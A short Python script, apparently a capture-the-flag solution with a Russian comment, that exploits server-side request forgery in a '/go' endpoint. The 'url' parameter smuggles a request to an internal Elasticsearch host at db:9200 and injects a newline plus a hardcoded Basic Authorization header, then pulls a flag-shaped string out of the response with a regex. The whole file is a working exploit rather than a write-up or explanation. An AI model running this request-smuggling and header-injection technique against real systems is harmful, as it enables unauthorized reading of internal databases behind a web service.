import re
import requests

host_with_port = input("Enter host with port: ")

# Предполагаем, что мы знаем о существовании индекса smth_interesting
first = requests.post(f"http://{host_with_port}/go", data={
    'url': "db:9200/smth_interesting/_search?pretty=true&q=*:* HTTP/1.1\nAuthorization: Basic Y3RmY3VwOmN0ZmN1cA"
})

content = first.content.decode('utf-8')

print(re.findall(r'\"text\"\s:\s\"\w*{[\w+_-]+}\"', content))
